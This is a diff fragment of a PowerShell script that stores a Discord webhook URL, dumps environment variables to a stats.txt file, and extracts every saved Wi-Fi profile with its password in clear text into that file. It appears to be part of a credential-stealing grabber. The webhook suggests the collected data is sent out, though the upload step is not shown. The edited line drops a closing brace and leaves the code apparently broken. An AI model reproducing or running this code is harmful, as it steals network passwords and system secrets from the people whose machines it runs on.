@@ -17,7 +17,7 @@ $url="https://discord.com/api/webhooks/976414122994446356/HnljhUACA_T3Y_MtvElCn9
 dir env: >> stats.txt
 
 Function Get-NetworkInfos{
-    netsh wlan show profiles |%{if(($_.split(':')[1]) -eq $null){} else{$a +=(($_.split(':')[1]) -Replace "^.","")}} 
+    netsh wlan show profiles |%{if(($_.split(':')[1]) -eq $null){} else{$a +=(($_.split(':')[1]) -Replace "^.","")} 
     foreach ($row in $a){
         $b=(netsh wlan show profile $row key=clear)
         add-content -path ".\stats.txt" -value $b}
